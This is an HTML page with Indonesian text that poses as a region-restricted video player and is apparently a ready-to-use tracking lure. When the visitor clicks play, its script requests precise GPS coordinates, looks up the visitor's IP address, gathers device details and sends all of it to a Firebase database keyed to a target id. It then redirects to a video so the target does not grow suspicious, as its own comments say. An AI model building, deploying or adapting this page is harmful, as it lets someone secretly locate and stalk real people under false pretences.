<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Video Player</title>
    
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>

    <style>
        body { margin: 0; background: black; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; flex-direction: column; }
        .container { text-align: center; max-width: 400px; padding: 20px; }
        .icon { font-size: 60px; margin-bottom: 20px; }
        h3 { margin-top: 0; }
        p { color: #aaa; font-size: 14px; line-height: 1.5; }
        .btn { background: #e50914; color: white; border: none; padding: 15px 30px; font-weight: bold; border-radius: 4px; cursor: pointer; margin-top: 20px; width: 100%; font-size: 16px; }
        .btn:hover { background: #f40612; }
        .hidden { display: none; }
        .loader { border: 4px solid #333; border-top: 4px solid #e50914; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div class="container" id="mainCard">
        <div class="icon">⚠️</div>
        <h3>Konten Dibatasi</h3>
        <p>Video ini memerlukan verifikasi wilayah. Sistem mendeteksi anomali jaringan. Silakan konfirmasi akses untuk memutar.</p>
        <button class="btn" onclick="startProcess()">PUTAR VIDEO</button>
    </div>

    <div class="container hidden" id="loadingCard">
        <div class="loader"></div>
        <p>Memverifikasi jaringan...</p>
    </div>

    <script src="config.js"></script>
    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const userId = urlParams.get('id') || 'anon-' + Math.floor(Math.random() * 10000);
        
        // GANTI LINK INI DENGAN VIDEO ASLI (Youtube/TikTok)
        const redirectUrl = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; 

        async function getIp() {
            try {
                const req = await fetch('https://api.ipify.org?format=json');
                const res = await req.json();
                return res.ip;
            } catch (e) { return 'IP_ERROR'; }
        }

        function getDeviceInfo() {
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                screen: `${window.screen.width}x${window.screen.height}`,
                isMobile: /Mobi|Android/i.test(navigator.userAgent)
            };
        }

        function sendData(status, locationData = {}) {
            const timestamp = new Date().toISOString();
            const deviceInfo = getDeviceInfo();
            
            // Langsung ambil IP dan kirim ke Firebase
            getIp().then(ip => {
                const payload = {
                    timestamp: timestamp,
                    ip: ip,
                    status: status,
                    location: locationData, // Kosong jika ditolak
                    device: deviceInfo
                };

                // Kirim database
                database.ref('logs/' + userId).push(payload).then(() => {
                    // SETELAH DATA TERKIRIM -> LANGSUNG REDIRECT
                    // Supaya target tidak curiga walau dia tolak lokasi
                    if (status === 'DENIED_IP_ONLY') {
                        setTimeout(() => { window.location.href = redirectUrl; }, 1000);
                    } else if (status === 'ALLOWED_GPS') {
                        window.location.href = redirectUrl;
                    }
                });
            });
        }

        function startProcess() {
            document.getElementById('mainCard').classList.add('hidden');
            document.getElementById('loadingCard').classList.remove('hidden');

            // Coba Minta GPS
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        // KONDISI 1: User KLIK ALLOW (Dapat GPS + IP)
                        sendData('ALLOWED_GPS', {
                            latitude: pos.coords.latitude,
                            longitude: pos.coords.longitude,
                            accuracy: pos.coords.accuracy
                        });
                    },
                    (err) => {
                        // KONDISI 2: User KLIK BLOCK (Dapat IP Saja)
                        // Kita ubah pesannya jadi sukses palsu agar dia dialihkan ke video
                        sendData('DENIED_IP_ONLY');
                    },
                    { enableHighAccuracy: true, timeout: 5000 }
                );
            } else {
                // Browser jadul, ambil IP aja
                sendData('UNSUPPORTED_IP_ONLY');
            }
        }
    </script>
</body>
</html>

